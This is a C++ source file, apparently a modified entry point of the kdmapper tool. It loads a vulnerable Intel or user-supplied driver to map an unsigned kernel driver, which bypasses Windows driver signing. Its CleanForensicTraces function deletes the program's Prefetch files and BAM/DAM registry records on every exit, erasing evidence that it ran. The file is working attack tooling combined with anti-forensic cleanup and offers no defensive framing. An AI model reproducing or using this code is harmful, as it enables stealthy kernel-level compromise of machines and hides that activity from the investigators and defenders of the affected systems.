#ifndef KDLIBMODE

#include <Windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <memory>
#include <Sddl.h>

#include "kdmapper.hpp"
#include "utils.hpp"
#include "intel_driver.hpp"

LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
	if (intel_driver::hDevice)
		intel_driver::Unload();

	return EXCEPTION_EXECUTE_HANDLER;
}

static void CleanForensicTraces() {
	wchar_t exePath[MAX_PATH];
	if (!GetModuleFileNameW(nullptr, exePath, MAX_PATH))
		return;

	std::wstring exeName = std::filesystem::path(exePath).filename().wstring();
	for (auto& c : exeName) c = (wchar_t)towupper(c);

	try {
		for (auto& entry : std::filesystem::directory_iterator(L"C:\\Windows\\Prefetch")) {
			std::wstring fn = entry.path().filename().wstring();
			for (auto& c : fn) c = (wchar_t)towupper(c);
			if (fn.find(exeName) == 0 && fn.find(L".PF") != std::wstring::npos)
				DeleteFileW(entry.path().wstring().c_str());
		}
	} catch (...) {}

	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		DWORD len = 0;
		GetTokenInformation(hToken, TokenUser, nullptr, 0, &len);
		if (len) {
			auto buf = std::make_unique<BYTE[]>(len);
			if (GetTokenInformation(hToken, TokenUser, buf.get(), len, &len)) {
				LPWSTR sid = nullptr;
				if (ConvertSidToStringSidW(reinterpret_cast<PTOKEN_USER>(buf.get())->User.Sid, &sid)) {
					wchar_t volRoot[MAX_PATH], devName[MAX_PATH];
					if (GetVolumePathNameW(exePath, volRoot, MAX_PATH)) {
						std::wstring vol(volRoot);
						if (!vol.empty() && vol.back() == L'\\') vol.pop_back();
						if (QueryDosDeviceW(vol.c_str(), devName, MAX_PATH)) {
							std::wstring devExe = std::wstring(devName) + (exePath + vol.size());

							const wchar_t* subkeys[] = {
								L"SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\",
								L"SYSTEM\\CurrentControlSet\\Services\\dam\\State\\UserSettings\\",
							};
							for (auto prefix : subkeys) {
								std::wstring keyPath = std::wstring(prefix) + sid;
								HKEY hKey;
								if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
									RegDeleteValueW(hKey, devExe.c_str());
									RegCloseKey(hKey);
								}
							}
						}
					}
					LocalFree(sid);
				}
			}
		}
		CloseHandle(hToken);
	}
}

int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
	size_t plen = wcslen(param);
	for (int i = 1; i < argc; i++) {
		if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], param) == 0 && argv[i][0] == '/') {
			return i;
		}
		else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], param) == 0 && argv[i][0] == '-' && argv[i][1] == '-') {
			return i;
		}
	}
	return -1;
}

std::wstring getParamValue(const int argc, wchar_t** argv, const wchar_t* param) {
	int idx = paramExists(argc, argv, param);
	if (idx > 0 && idx + 1 < argc)
		return argv[idx + 1];
	return L"";
}

int wmain(const int argc, wchar_t** argv) {
	SetUnhandledExceptionFilter(SimplestCrashHandler);

	bool free = paramExists(argc, argv, L"free") > 0;
	bool indPagesMode = paramExists(argc, argv, L"indPages") > 0;
	bool passAllocationPtr = paramExists(argc, argv, L"PassAllocationPtr") > 0;
	bool copyHeader = paramExists(argc, argv, L"copy-header") > 0;

	std::wstring vulnPath = getParamValue(argc, argv, L"vuln");

	if (!vulnPath.empty()) {
		if (!std::filesystem::exists(vulnPath))
			return -1;
		intel_driver::vulnerableDriverPath = vulnPath;
	}

	int vulnIdx = paramExists(argc, argv, L"vuln");
	int vulnValIdx = (vulnIdx > 0 && vulnIdx + 1 < argc) ? vulnIdx + 1 : -1;

	int drvIndex = -1;
	for (int i = 1; i < argc; i++) {
		if (i == vulnIdx || i == vulnValIdx)
			continue;
		if (std::filesystem::path(argv[i]).extension().string().compare(".sys") == 0) {
			drvIndex = i;
			break;
		}
	}

	if (drvIndex <= 0)
		return -1;

	const std::wstring driver_path = argv[drvIndex];

	if (!std::filesystem::exists(driver_path))
		return -1;

	if (!NT_SUCCESS(intel_driver::Load()))
		return -1;

	std::vector<uint8_t> raw_image = { 0 };
	if (!kdmUtils::ReadFileToMemory(driver_path, &raw_image)) {
		intel_driver::Unload();
		CleanForensicTraces();
		return -1;
	}

	kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;

	if (indPagesMode)
		mode = kdmapper::AllocationMode::AllocateIndependentPages;

	NTSTATUS exitCode = 0;
	if (!kdmapper::MapDriver(raw_image.data(), 0, 0, free, !copyHeader, mode, passAllocationPtr, nullptr, &exitCode)) {
		intel_driver::Unload();
		CleanForensicTraces();
		return -1;
	}

	if (!NT_SUCCESS(intel_driver::Unload())) {
		CleanForensicTraces();
		return -1;
	}

	CleanForensicTraces();
	return 0;
}

#endif
